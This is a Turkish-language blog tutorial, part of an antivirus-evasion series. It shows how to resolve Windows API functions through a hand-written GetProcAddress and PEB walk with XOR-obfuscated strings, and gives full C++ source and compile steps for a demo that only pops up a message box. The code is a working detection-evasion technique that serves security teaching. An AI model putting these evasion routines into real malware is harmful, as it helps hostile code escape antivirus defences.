\newpage
\subsection{65. malware AV/VM evasion - bölüm 12 (blogda bölüm 16): WinAPI
GetProcAddress uygulaması. Basit C++ örneği.}

﷽

![av-evasion](./images/93/2023-04-17_00-50.png){width="80%"}      

Bu gönderi, AV motorlarını atlatmaya yönelik başka bir popüler teknik olan WinAPI GetProcAddress uygulaması üzerine yaptığım kendi araştırmamın sonucudur.     

### GetProcAddress

`GetProcAddress`, belirtilen `DLL`'den dışa aktarılan bir işlevin veya değişkenin adresini alan bir Windows API işlevidir. Bu işlev, çalışma zamanında bir `DLL`'den işlev yüklemek istediğinizde kullanışlıdır; bu işlem dinamik bağlama veya çalışma zamanı bağlama olarak da bilinir:      

```cpp
FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR  lpProcName
);
```

- `hModule` - İşlevi veya değişkeni içeren DLL modülüne yönelik bir tutamac. Bu tutamac, LoadLibrary veya LoadLibraryEx işlevi tarafından döndürülür.    
- `lpProcName` - İşlev veya değişkenin NULL ile sonlandırılmış bir dize olarak adı veya işlevin sıra numarası. Bu parametre bir sıra numarası ise, düşük sıralı kelime içinde olmalı ve yüksek sıralı kelime sıfır olmalıdır.     

Eğer işlev başarılı olursa, döndürdüğü değer dışa aktarılan işlevin veya değişkenin adresidir. Eğer başarısız olursa, `NULL` döndürülür.     

### pratik örnek: `GetProcAddress`'in özel uygulaması

[Önceki](https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html) gönderide olduğu gibi, `GetProcAddress`'in en basit uygulamasını Process Environment Block (PEB) kullanarak oluşturmak, belirli senaryolarda antivirüs (AV) tespitinden kaçınmaya yardımcı olabilir.     

```cpp
FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS ntHeaders = 
  (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY exportDirectory = 
  (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
  VirtualAddress);

  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + 
  exportDirectory->AddressOfFunctions);
  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + 
  exportDirectory->AddressOfNameOrdinals);
  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + 
  exportDirectory->AddressOfNames);

  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
    }
  }

  return NULL;
}
```

Bu kodun adım adım açıklaması:    
- `DOS` ve `NT` başlıklarını alın: Modülün temel adresini (`hModule`) `PIMAGE_DOS_HEADER` işaretçisine dönüştürün ve `e_lfanew` alanını temel adrese ekleyerek `PIMAGE_NT_HEADERS` yapısını bulun.    
- dışa aktarma dizinini bulun: `PIMAGE_NT_HEADERS` yapısındaki     
`OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress`    
alanını kullanarak `PIMAGE_EXPORT_DIRECTORY` yapısını bulun.     
- dışa aktarma tablolarına erişim sağlayın: `PIMAGE_EXPORT_DIRECTORY` yapısındaki ilgili alanları ve modülün temel adresini kullanarak `AddressOfFunctions`,  `AddressOfNameOrdinals` ve `AddressOfNames` tablolarına işaretçiler edinin.    
- İsimleri yineleyin: `AddressOfNames` tablosunda `NumberOfNames` kadar döngü oluşturarak her işlev adını `lpProcName` ile karşılaştırın (`strcmp` kullanarak).        
- İşlev adresini bulun: İşlev adı eşleşirse, `AddressOfNameOrdinals` tablosunu kullanarak işlevin sıra numarasını [bulun](https://cocomelonc.github.io/tutorial/2022/03/18/simple-malware-av-evasion-4.html). Daha sonra `AddressOfFunctions` tablosunu kullanarak işlevin göreli sanal adresini (`RVA`) bulun ve modülün temel adresine ekleyerek mutlak işlev adresini hesaplayın.    

### AV atlatma “malware” örneği

Peki, "malware" örneği ne olacak? Bunun için [önceki](https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html) gönderideki kodu güncelledim ve WinAPI `GetProcAddress`'in kendi uygulamamı ekledim.Tam kaynak kodu şu şekildedir:     

```cpp
/*
 * hack.cpp - GetProcAddress implementation. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/2023/04/16/malware-av-evasion-16.html
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>

#pragma comment(lib, "Shlwapi.lib")

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
  _wcslwr_s(substr, MAX_PATH);
  _wcslwr_s(mystr, MAX_PATH);

  int result = 0;
  if (StrStrW(mystr, substr) != NULL) {
    result = 1;
  }

  return result;
}

typedef UINT(CALLBACK* fnMessageBoxA)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

  // obtaining the offset of PPEB from the beginning of TEB
  PEB* pPeb = (PEB*)__readgsqword(0x60);

  // for x86
  // PEB* pPeb = (PEB*)__readgsqword(0x30);

  // obtaining the address of the head node in a linked list 
  // which represents all the models that are loaded into the process.
  PEB_LDR_DATA* Ldr = pPeb->Ldr;
  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 

  // iterating to the next node. this will be our starting point.
  LIST_ENTRY* pStartListEntry = ModuleList->Flink;

  // iterating through the linked list.
  WCHAR mystr[MAX_PATH] = { 0 };
  WCHAR substr[MAX_PATH] = { 0 };
  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; 
  pListEntry = pListEntry->Flink) {

    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
    LDR_DATA_TABLE_ENTRY* pEntry = 
    (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

    // checking if this is the DLL we are looking for
    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
    wcscpy_s(substr, MAX_PATH, lModuleName);
    if (cmpUnicodeStr(substr, mystr)) {
      // returning the DLL base address.
      return (HMODULE)pEntry->DllBase;
    }
  }

  // the needed DLL wasn't found
  printf("failed to get a handle to %s\n", lModuleName);
  return NULL;
}

FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + 
  dosHeader->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY exportDirectory = 
  (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
  VirtualAddress);

  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + 
  exportDirectory->AddressOfFunctions);
  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + 
  exportDirectory->AddressOfNameOrdinals);
  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + 
  exportDirectory->AddressOfNames);

  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
    }
  }

  return NULL;
}


// encrypted function name (MessageBoxA)
unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2, 0x17, 0x31, 0xa, 
0x1b, 0x33 };

// encrypted module name (user32.dll)
unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43, 0x57, 0x5c, 0x17, 0x9, 
0xf };

// key
char s_key[] = "mysupersecretkey";

// XOR decrypt
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}


int main(int argc, char* argv[]) {
  XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
  XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));

  wchar_t wtext[20];
  mbstowcs(wtext, s_dll, strlen(s_dll)+1); //plus null
  LPWSTR user_dll = wtext;

  HMODULE mod = myGetModuleHandle(user_dll);
  if (NULL == mod) {
    return -2;
  } else {
    printf("meow");
  }

  fnMessageBoxA myMessageBoxA = 
  (fnMessageBoxA)myGetProcAddress(mod, (LPCSTR)s_mb);
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Gördüğünüz gibi, tek fark yeni `myGetProcAddress` işlevidir.      

### demo

Her şeyi çalışırken görelim. Öncelikle "malware" kodumuzu derleyelim:       

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![av-evasion](./images/93/2023-04-17_01-30.png){width="80%"}      

ve hedef makinede (`Windows 10 x64`) çalıştırın:      

```powershell
.\hack.exe
```

![av-evasion](./images/93/2023-04-17_01-35.png){width="80%"}      

Gördüğünüz gibi, sonuç olarak, `GetProcAddress` WinAPI gizlenmiş: belirli senaryolarda AV motorlarını atlatıyor.    

Manuel olarak `GetProcAddress`'i `PEB` kullanarak uygulamak zor ve hata yapmaya açık bir görev olabilir, ancak Windows modül yükleme mekanizmasının iç işleyişini ele almak, tersine mühendislik ve zararlı yazılım analizi gibi ileri düzey görevler için faydalı olabilir.      

Bu gönderinin mavi takım üyelerine bu ilginç kaçınma tekniği hakkında farkındalık kazandırmasını ve kırmızı takım üyelerinin cephaneliğine yeni bir silah eklemesini umuyorum.        

[MITRE ATT&CK: T1027](https://attack.mitre.org/techniques/T1027/)       
[AV evasion: part 1](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html)     
[AV evasion: part 2](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html)      
[AV evasion: part 4](https://cocomelonc.github.io/tutorial/2022/03/18/simple-malware-av-evasion-4.html)               
[GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)         
[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-04-16-malware-av-evasion-16)    
